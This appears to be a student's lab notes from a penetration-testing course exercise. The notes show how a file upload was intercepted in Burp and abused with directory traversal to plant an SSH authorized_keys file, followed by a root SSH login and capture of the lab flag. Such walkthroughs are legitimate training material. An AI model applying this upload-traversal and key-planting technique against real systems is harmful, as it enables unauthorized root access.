Use Burp to see the files you upload and send it to repeater
![[Pasted image 20230929081700.png]]

Use directory traversal technique to see if you can get a proper response for it

![[Pasted image 20230929081856.png]]


┌──(hollacosta㉿kali1)-[~/Downloads]
└─$ cd ~/Downloads

**CREATE THE SSH KEY**
┌──(hollacosta㉿kali1)-[~/Downloads]
└─$ ssh-keygen                                      
Generating public/private rsa key pair.
Enter file in which to save the key (/home/hollacosta/.ssh/id_rsa): **thefile** MAKE SURE IT MATCHES WHEN YOU ATTEMPT TO SSH INTO IT
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in thefile
Your public key has been saved in thefile.pub
The key fingerprint is:
SHA256:a6YPagjbHLpZqV++MGDLXqHD7hhjKlbbgudatUhmvbQ hollacosta@kali1
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|                 |
|                 |
|    .            |
|.. = +  S        |
|=.Bo= +  .       |
|o&B*+E. +        |
|XOBO.o =         |
|XB=o=....        |
+----[SHA256]-----+
                                                                                 
┌──(hollacosta㉿kali1)-[~/Downloads]
└─$ cat thefile.pub > authorized_keys ------this creates the authorized_keys folder to to add to the link
                                                                                 
┌──(hollacosta㉿kali1)-[~/Downloads]
└─$ ls
 36374.txt                                  Obsidian-1.4.13.AppImage
 36374.zip                                  plugin.zip
 50383.sh                                   plug.php
 50581.py                                   plug.zip
 authorized_keys                            sha256sum_nessus
'Basic Vulnerability Scanning_0ugmaq.pdf'   test.txt
 http-vuln-cve-2021-41773.nse               Test.txt
 Nessus-10.6.1-debian10_amd64.deb           thefile
 Nessus-10.6.1-debian10_i386.deb            thefile.pub
                                                                                 
┌──(hollacosta㉿kali1)-[~/Downloads]
└─$ cat authorized_keys              
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDb5wVhzzrVxJ2HMhI8jX2+hhnE3nDvEjeMY7FwdieB8FA38raYGVzBkFiahTD2JjVxbUYAUGQmlFN5s4GaNKy6nimf+u0ZWgwqpamiOgFOE0WF4e1c+auDMQpFMeZO7BEmUt2j+tgp27AFGB8AZ9OQ4vkO2QqC8ALCcnzyDMsa8LwjzYNpVjNyR2U6+YOPUwpOO0Nq4x6F9GLdpi+IAM5QGl/MwfGG65fYA1pwMpQc4H6HVditvw4LF2h0P1Z+zBQ9RLL/6Y/oyF/iNFU36N2otes/du0MOHt5WmEUcuzatUyv7zUsAJw7oK3kQlGGOYU5eC5OaG7IEjgrdBr36QNfSb89H+fH4MLZrSFGaY9xxDTiu9ERPQyMWOmBDn8290YYGZrF5xIS/OyUGIvTmD1d52L7dL273Vvr5Rl95VWWVfQf6F2CSsnwvrJoyPAzgMcgzJX0E83Ac0U5n7F4AzubeqgP+dUx2G3VxZrK4m/Bm/KZyndNSUF897vwpXgZiv0= hollacosta@kali1
                                                                                 
┌──(hollacosta㉿kali1)-[~/Downloads]
└─$ rm known_hosts           -------------TO AVOID ANY CONNECTION CONFLICTS
rm: cannot remove 'known_hosts': No such file or directory
                                                                                 
┌──(hollacosta㉿kali1)-[~/Downloads]
└─$ ssh -p 2222 -i **thefile** root@mountaindesserts.com       **MATCH THE NAME WITH THE SSH KEYGEN YOU JUST CREATED**                 1 ⨯
Linux 84e850ae62ab 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@84e850ae62ab:~# cat /root/flag.txt
OS{0abee53b249dc5c654c0ffc1489fc77a}
root@84e850ae62ab:~# 

